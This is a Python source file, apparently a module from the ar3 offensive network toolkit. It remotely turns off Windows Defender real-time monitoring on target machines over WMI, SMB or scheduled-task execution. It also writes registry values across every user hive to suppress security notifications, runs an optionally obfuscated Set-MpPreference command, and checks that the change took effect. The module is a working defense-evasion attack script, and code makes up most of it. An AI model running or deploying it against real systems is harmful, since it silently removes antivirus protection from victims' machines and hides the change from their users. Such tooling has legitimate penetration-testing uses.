from time import sleep
from ar3.ops.enum.host_enum import code_execution
from ar3.helpers import powershell

class KillDefender():
    def __init__(self):
        self.name           = 'Kill Defender'
        self.description    = 'Kill Windows Defender Real Time Monitoring'
        self.author         = ['@m8r0wn']
        self.credit         = ['@awsmhacks']
        self.requires_admin = True
        self.exec_methods   = ['wmiexec', 'smbexec', 'atexec']
        self.args = {
            'ACTION': {
                'Description': 'disable: turn-off Defender | enable: re-enable defender',
                'Required': False,
                'Value': 'disable'
            }
        }


    def run(self, target, args, smb_con, loggers, config_obj):

        '''
        Full credit for kill-defender goes to @awsmhacks, amazing work!
        This was implemented in his project over at: https://github.com/awsmhacks/CrackMapExtreme

        Additional Resources:
        https://www.tenforums.com/tutorials/105486-enable-disable-notifications-windows-security-windows-10-a.html
        '''

        logger = loggers['console']
        logger.warning([smb_con.host, smb_con.ip, self.name.upper(), "This module is still in testing and not opsec safe..."])

        if self.args['ACTION']['Value'].lower() == 'disable':
            notify = "Enabled"
            action = "$true"
        elif self.args['ACTION']['Value'].lower() == 'enable':
            notify = "Disabled"
            action = "$false"
        else:
            loggers['console'].fail([smb_con.host, smb_con.ip, self.name.upper(), "Invalid module arg, only {enable, disable} allowed"])
            return

        kill_notify = """"FOR /F %a IN ('REG.EXE QUERY hku 2^>NUL ^| FIND ^"HKEY_USERS^"') DO REG.EXE add ^"%a\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Notifications\\Settings\\Windows.SystemToast.SecurityAndMaintenance^" /v ^"{}^" /d ^"0^" /t REG_DWORD /F" """.format(notify)
        kill_defender = 'Set-MpPreference -DisableRealtimeMonitoring {};'.format(action)
        kd_verify     = 'Get-MpPreference |select DisableRealtimeMonitoring'

        try:
            # Modify notifications
            x = code_execution(smb_con, args, target, loggers, config_obj, kill_notify, return_data=True)

            # Modify Defender
            cmd = powershell.create_ps_command(kill_defender, loggers['console'], force_ps32=args.force_ps32, no_obfs=args.no_obfs, server_os=smb_con.os)
            x   = code_execution(smb_con, args, target, loggers, config_obj, cmd, return_data=True)

            loggers['console'].info([smb_con.host, smb_con.ip, self.name.upper(), 'Execution complete, Sleeping 5 seconds for process shutdown...'])
            sleep(8)

            # Verify
            loggers['console'].info([smb_con.host, smb_con.ip, self.name.upper(), 'Verifying Defender status...'])
            cmd = powershell.create_ps_command(kd_verify, loggers['console'], force_ps32=args.force_ps32,no_obfs=args.no_obfs, server_os=smb_con.os)
            x   = code_execution(smb_con, args, target, loggers, config_obj, cmd, return_data=True)
            for line in x.splitlines():
                loggers['console'].info([smb_con.host, smb_con.ip, self.name.upper(), line])

        except Exception as e:
            logger.debug("{} Error: {}".format(self.name, str(e)))